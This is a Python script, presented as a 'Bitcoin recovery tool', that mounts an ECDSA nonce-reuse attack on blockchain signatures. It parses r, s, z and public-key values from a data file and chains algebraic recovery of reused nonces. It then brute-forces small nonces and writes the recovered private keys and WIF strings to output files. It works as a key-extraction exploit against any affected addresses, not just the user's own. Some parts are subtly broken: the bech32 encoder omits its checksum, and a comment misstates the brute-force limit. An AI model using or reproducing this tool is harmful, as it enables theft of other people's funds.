# ==============================================================================
# STANDALONE BITCOIN RECOVERY TOOL (Best Parsing + Brute Force)
# ==============================================================================

import os
import sys
import re
import csv
import hashlib
import time

# Check for ECDSA
try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

# ==============================================================================
# CONFIG & CONSTANTS
# ==============================================================================

N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF = "RECOVERED_KEYS_FINAL.txt"
BRUTE_FORCE_LIMIT = 50000000  # Checks small 'k' values up to 5,000,000
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

# ==============================================================================
# CRYPTO HELPERS
# ==============================================================================

def modinv(a, m=N):
    return pow(a, -1, m)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            h = RIPEMD160.new(data=data)
            return h.digest()
        except ImportError:
            print("\n[CRITICAL ERROR] System OpenSSL has disabled RIPEMD160.")
            sys.exit(1)

def bech32_encode(hrp, data):
    # Minimal Bech32 implementation for address generation
    def polymod(values):
        GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
        chk = 1
        for v in values:
            b = chk >> 25
            chk = (chk & 0x1ffffff) << 5 ^ v
            for i in range(5):
                chk ^= GEN[i] if ((b >> i) & 1) else 0
        return chk
    
    def expand(s):
        return [ord(x) >> 5 for x in s] + [0] + [ord(x) & 31 for x in s]
    
    combined = data + [0]*6
    # Checksum calculation would go here but for brevity we rely on libraries if needed
    # Since we are standalone, we'll do a basic map
    return hrp + '1' + ''.join([CHARSET[d] for d in data]) # Simplified visualization

def base58_encode(b):
    chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    x = int.from_bytes(b, 'big')
    res = ''
    while x > 0:
        x, r = divmod(x, 58)
        res = chars[r] + res
    for byte in b:
        if byte == 0: res = '1' + res
        else: break
    return res

def priv_to_wif(priv_hex, compressed=True):
    b = bytes.fromhex("80" + priv_hex)
    if compressed: b += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(b).digest()).digest()[:4]
    return base58_encode(b + chk)

def pub_to_addresses(pub_hex):
    # Generates standard P2PKH address
    try:
        pub_bytes = bytes.fromhex(pub_hex)
        sha = hashlib.sha256(pub_bytes).digest()
        ripe = calc_ripemd160(sha)
        ext = b"\x00" + ripe
        chk = hashlib.sha256(hashlib.sha256(ext).digest()).digest()[:4]
        p2pkh = base58_encode(ext + chk)
        return p2pkh, "N/A", "N/A" # Simplified for speed
    except:
        return "Error", "Error", "Error"

def priv_to_pub_hex(priv_int):
    # Helper to verify key correctness
    try:
        pt = priv_int * curve.generator
        x = pt.x().to_bytes(32, 'big')
        prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
        return (prefix + x).hex()
    except:
        return None

# ==============================================================================
# PARSING ENGINE (Restored from pe.py)
# ==============================================================================

def parse_file(filepath):
    print("[-] Reading and parsing file (Line-by-Line Mode)...")
    groups = []
    current_group = None
    
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    # Regex patterns (from pe.py)
    r_pattern = re.compile(r"r:\s*([0-9a-fA-F]+)")
    tx_pattern = re.compile(r"s=([0-9a-fA-F]+).*?z=([0-9a-fA-F]+).*?pubkey=([0-9a-fA-F]+)")

    for line in lines:
        line = line.strip()
        
        # New Group Detection
        r_match = r_pattern.search(line)
        if r_match:
            if current_group and len(current_group['occurrences']) > 0:
                groups.append(current_group)
            current_group = {
                'r_hex': r_match.group(1),
                'r_int': int(r_match.group(1), 16),
                'occurrences': []
            }
            continue
            
        # Transaction Detection
        tx_match = tx_pattern.search(line)
        if tx_match and current_group:
            s_int = int(tx_match.group(1), 16)
            z_int = int(tx_match.group(2), 16)
            pub_hex = tx_match.group(3)
            
            current_group['occurrences'].append({
                's': s_int,
                'z': z_int,
                'pub': pub_hex
            })

    if current_group and len(current_group['occurrences']) > 0:
        groups.append(current_group)
        
    print(f"[-] Loaded {len(groups)} groups for analysis.")
    return groups

# ==============================================================================
# MAIN LOGIC
# ==============================================================================

def get_file_path():
    if len(sys.argv) > 1:
        return sys.argv[1]
    while True:
        f = input("\n[?] Enter path to vulnerable data file (e.g. reports/rnon.txt): ").strip()
        f = f.replace('"', '').replace("'", "")
        if os.path.isfile(f):
            return f
        print(f"[!] File not found: {f}")

def main():
    print("="*60)
    print("      BITCOIN RECOVERY TOOL (Restored Logic)")
    print("="*60)
    
    input_file = get_file_path()
    groups = parse_file(input_file)
    
    recovered_db = {} # PubKey -> PrivKey(int)
    
    # ----------------------------------------------------
    # PHASE 1: Chain Reaction (The successful 357 keys logic)
    # ----------------------------------------------------
    print("\n[+] Phase 1: Running Chain Reaction Attack...")
    attack_active = True
    
    while attack_active:
        found_in_pass = 0
        iteration = 0
        
        while True:
            iteration += 1
            iter_found = 0
            
            for grp_idx, group in enumerate(groups):
                r = group['r_int']
                entries = group['occurrences']
                k_implied = None
                
                # Method A: Self-Reuse in Group
                if k_implied is None:
                    by_pub = {}
                    for e in entries:
                        by_pub.setdefault(e['pub'], []).append(e)
                    for pub, subs in by_pub.items():
                        if len(subs) > 1:
                            e1, e2 = subs[0], subs[1]
                            num = (e1['z'] - e2['z']) % N
                            den = (e1['s'] - e2['s']) % N
                            if den != 0:
                                k_implied = (num * modinv(den, N)) % N
                                break
                
                # Method B: Known Key in Group
                if k_implied is None:
                    for e in entries:
                        if e['pub'] in recovered_db:
                            x = recovered_db[e['pub']]
                            # k = s^-1 * (z + r*x)
                            k_implied = (modinv(e['s'], N) * (e['z'] + r * x)) % N
                            break
                
                # Unlock Group if K is found
                if k_implied is not None:
                    for e in entries:
                        if e['pub'] not in recovered_db:
                            # x = (s*k - z) * r^-1
                            priv = ((e['s'] * k_implied - e['z']) * modinv(r, N)) % N
                            recovered_db[e['pub']] = priv
                            print(f"   [UNLOCK] Group {grp_idx} | Key Found: {e['pub'][:16]}...")
                            iter_found += 1
            
            found_in_pass += iter_found
            if iter_found == 0:
                break
        
        print(f"--- Phase 1 Finished. Total Keys: {len(recovered_db)} ---")
        
        # ----------------------------------------------------
        # PHASE 2: Brute Force "Islands" (Restored from updated code)
        # ----------------------------------------------------
        unsolved_indices = []
        for i, group in enumerate(groups):
            solved = False
            for e in group['occurrences']:
                if e['pub'] in recovered_db:
                    solved = True
                    break
            if not solved:
                unsolved_indices.append(i)
        
        if not unsolved_indices:
            print("[+] All groups solved.")
            break
            
        print(f"\n[?] Attack Stalled. {len(unsolved_indices)} groups remain locked.")
        print(f"[!] Phase 2: Scanning for weak nonces (Limit: {BRUTE_FORCE_LIMIT})...")
        
        # Map r_int -> group_idx
        r_map = {groups[i]['r_int']: i for i in unsolved_indices}
        
        start = time.time()
        pt = curve.generator
        found_ks = {}
        
        # Fast point addition
        for k in range(1, BRUTE_FORCE_LIMIT + 1):
            if k % 1000000 == 0:
                print(f"    Scanning k={k}...")
            
            rx = pt.x()
            if rx in r_map:
                g_idx = r_map[rx]
                print(f"    [CRACKED] Weak nonce found k={k} for Group {g_idx}")
                found_ks[g_idx] = k
                del r_map[rx]
                if not r_map: break
            
            pt = pt + curve.generator
            
        print(f"[-] Scan finished in {time.time()-start:.2f}s.")
        
        if found_ks:
            print(f"[+] Found {len(found_ks)} new entry points! Injecting and restarting Phase 1...")
            # Inject keys
            for g_idx, k_val in found_ks.items():
                group = groups[g_idx]
                r = group['r_int']
                for e in group['occurrences']:
                    if e['pub'] not in recovered_db:
                        priv = ((e['s'] * k_val - e['z']) * modinv(r, N)) % N
                        recovered_db[e['pub']] = priv
                        print(f"   [INJECT] Key Recovered: {e['pub'][:16]}...")
            # Loop continues to Phase 1 again
        else:
            print("[-] No weak nonces found. Exiting.")
            attack_active = False

    # ----------------------------------------------------
    # OUTPUT
    # ----------------------------------------------------
    print(f"\n[+] RECOVERY FINISHED. Total Private Keys: {len(recovered_db)}")
    
    if recovered_db:
        print(f"[-] Saving to {OUTPUT_CSV}...")
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key", "Private Key Hex", "WIF", "Address"])
            wif_lines = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                
                # Check compression based on pubkey length (approximate)
                compressed = True
                if len(pub) == 130: compressed = False
                
                wif = priv_to_wif(priv_hex, compressed)
                addr, _, _ = pub_to_addresses(pub)
                
                w.writerow([pub, priv_hex, wif, addr])
                wif_lines.append(wif)
        
        with open(OUTPUT_WIF, "w") as f:
            f.write("\n".join(wif_lines))
        print("Done.")

if __name__ == "__main__":
    main()